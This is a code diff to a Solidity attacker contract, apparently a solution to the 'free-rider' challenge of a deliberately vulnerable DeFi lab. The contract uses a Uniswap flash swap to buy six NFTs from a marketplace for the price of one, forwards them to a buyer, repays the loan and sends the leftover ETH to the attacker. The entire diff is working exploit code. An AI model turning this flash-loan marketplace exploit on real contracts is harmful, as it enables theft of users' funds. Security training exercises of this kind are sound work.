@@ -6,6 +6,7 @@ import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiv
 import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
 import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
 
@@ -19,6 +20,7 @@ interface IUniswapV2Callee {
 }
 
 contract Attacker is IERC721Receiver, ReentrancyGuard {
+    using Address for address payable;
     address private immutable _buyer;
     address private immutable _attacker;
     address public dvt;
@@ -73,7 +75,6 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
     ) external {
         require(msg.sender == address(uniswapV2Pair), "not pair");
         require(sender == address(this), "not sender");
-        
 
         (address tokenBorrow, address caller) = abi.decode(
             data,
@@ -86,34 +87,44 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         require(tokenBorrow == address(weth), "token borrow != WETH");
         uint256 counter = 0;
 
-        for (counter; counter < 6; counter++) {
-            tokenIds.push(counter);
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
+            tokenIds[tokenId] = tokenId;
         }
+        
         weth.withdraw(15e18);
         freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
+
+        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
+             _nft.safeTransferFrom(address(this), _buyer, tokenId);
+        }
+       
+       // freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
         // about 0.3% fee, +1 to round up
         uint fee = (amount1 * 3) / 997 + 1;
         uint256 amountToRepay = amount1 + fee;
-        //weth.deposit{value: address(this).balance}();
+        weth.deposit{value: amountToRepay}();
         // Transfer flash swap fee from caller
         weth.transferFrom(caller, address(this), fee);
 
         // Repay
         weth.transfer(address(uniswapV2Pair), amountToRepay);
+        weth.withdraw(weth.balanceOf(address(this)));
+        payable(_attacker).sendValue(address(this).balance);
     }
 
-     function onERC721Received(
+    function onERC721Received(
         address operator,
         address from,
         uint256 tokenId,
         bytes calldata data
     ) external returns (bytes4) {
-        _nft.transferFrom(address(this), address(_buyer), tokenId);
+        //_nft.transferFrom(address(this), address(_buyer), tokenId);
         
         return IERC721Receiver.onERC721Received.selector;
     }
 
-    
-
-    receive() external payable {}
+    receive() external payable {
+      // weth.deposit{value: address(this).balance}();
+    }
 }
